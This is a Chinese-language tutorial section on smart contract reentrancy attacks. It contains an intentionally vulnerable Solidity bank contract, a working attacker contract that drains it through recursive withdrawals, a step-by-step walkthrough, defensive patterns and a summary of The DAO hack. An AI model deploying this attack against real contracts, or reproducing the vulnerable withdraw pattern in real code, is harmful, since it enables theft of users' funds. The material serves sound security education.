# 重入攻击（Reentrancy）

### 2.1 漏洞原理

重入攻击是最经典的智能合约漏洞之一。当合约在发送 ETH（或调用外部合约）之后才更新状态时，攻击者可以在外部调用中再次进入合约函数，利用状态尚未更新的漏洞重复提取资金。

**攻击图示：**

```
正常流程：
  检查余额 → 扣减余额 → 发送 ETH

漏洞流程（重入攻击）：
  检查余额 → 发送 ETH → [攻击者 fallback 再次调用 withdraw] → 检查余额 → 发送 ETH → ... → 扣减余额
                            ↑___________________________________________________________|
```

### 2.2 漏洞代码示例

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// ⚠️ 存在重入漏洞的合约
contract VulnerableBank {
    mapping(address => uint256) public balances;

    // 存款
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 提款函数 - 存在重入漏洞！
    function withdraw(uint256 _amount) public {
        // 1. 检查余额
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // 2. 发送 ETH（先转账！）
        // call 会转发所有 gas 给接收方
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");

        // 3. 扣减余额（后更新状态！）
        // 攻击者在第 2 步又调用了 withdraw，余额还没扣减
        balances[msg.sender] -= _amount;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

### 2.3 攻击合约

```solidity
// 攻击者合约
contract ReentrancyAttacker {
    VulnerableBank public vulnerableBank;

    constructor(address _bankAddress) public {
        vulnerableBank = VulnerableBank(_bankAddress);
    }

    // 攻击入口：先存款，再提款触发重入
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        
        // 1. 先存入一些 ETH
        vulnerableBank.deposit{value: msg.value}();
        
        // 2. 第一次提款，触发 fallback 中的递归提款
        vulnerableBank.withdraw(msg.value);
    }

    // fallback 函数：收到 ETH 时自动调用
    receive() external payable {
        // 如果银行合约还有钱，继续提款
        if (address(vulnerableBank).balance >= msg.value) {
            vulnerableBank.withdraw(msg.value);
        }
    }

    // 提取攻击所得
    function withdrawStolenFunds() external {
        msg.sender.transfer(address(this).balance);
    }
}
```

### 2.4 攻击步骤详解

```
步骤 1：攻击者部署攻击合约，存入 1 ETH
  → 攻击者余额 = 1 ETH
  → 银行合约余额 = 1 ETH

步骤 2：调用 withdraw(1 ETH)
  → 检查余额：1 ETH >= 1 ETH ✓
  → 发送 1 ETH 给攻击合约
  → 攻击合约的 receive() 被触发

步骤 3：receive() 中再次调用 withdraw(1 ETH)
  → 检查余额：1 ETH >= 1 ETH ✓ （余额还没扣减！）
  → 发送 1 ETH 给攻击合约
  → receive() 再次被触发

步骤 4：递归重复步骤 3
  → 直到银行合约余额不足或 gas 耗尽

步骤 5：最后一层调用返回
  → 扣减余额：balances[attacker] = 0
  → 逐层返回，每次都扣减余额
  → 但攻击者已经提走了远超其存款的资金
```

### 2.5 防御方法

#### 方法一：检查-生效-交互模式（Checks-Effects-Interactions）

**原则：** 先做所有检查，然后更新所有状态，最后才与外部合约交互。

```solidity
function withdraw(uint256 _amount) public {
    // 1. 检查（Checks）
    require(balances[msg.sender] >= _amount, "Insufficient balance");

    // 2. 生效（Effects）- 先更新状态！
    balances[msg.sender] -= _amount;

    // 3. 交互（Interactions）- 最后才转账
    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Transfer failed");
}
```

#### 方法二：重入锁（Reentrancy Guard）

使用 OpenZeppelin 的 `ReentrancyGuard`：

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureBank is ReentrancyGuard {
    mapping(address => uint256) public balances;

    // 使用 nonReentrant 修饰符
    function withdraw(uint256 _amount) public nonReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        balances[msg.sender] -= _amount;
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }
}
```

**重入锁原理：**
```solidity
contract ReentrancyGuard {
    bool private _locked;

    modifier nonReentrant() {
        require(!_locked, "Reentrant call");
        _locked = true;
        _;
        _locked = false;
    }
}
```

#### 方法三：Pull 模式（让用户主动提取）

```solidity
// Push 模式（不安全）：合约主动给用户转账
function withdrawPush() public {
    msg.sender.call{value: balances[msg.sender]}("");
    balances[msg.sender] = 0;
}

// Pull 模式（安全）：先记录欠款，用户自己 claim
mapping(address => uint256) public pendingWithdrawals;

function withdraw() public {
    uint256 amount = balances[msg.sender];
    require(amount > 0);
    
    balances[msg.sender] = 0;
    pendingWithdrawals[msg.sender] = amount;
}

function claimWithdrawal() public {
    uint256 amount = pendingWithdrawals[msg.sender];
    pendingWithdrawals[msg.sender] = 0;
    msg.sender.call{value: amount}("");
}
```

### 2.6 真实案例：The DAO 攻击

- **时间**：2016 年 6 月
- **损失**：约 360 万 ETH
- **原因**：`splitDAO` 函数存在重入漏洞
- **结果**：以太坊硬分叉为 ETH 和 ETC

---

---

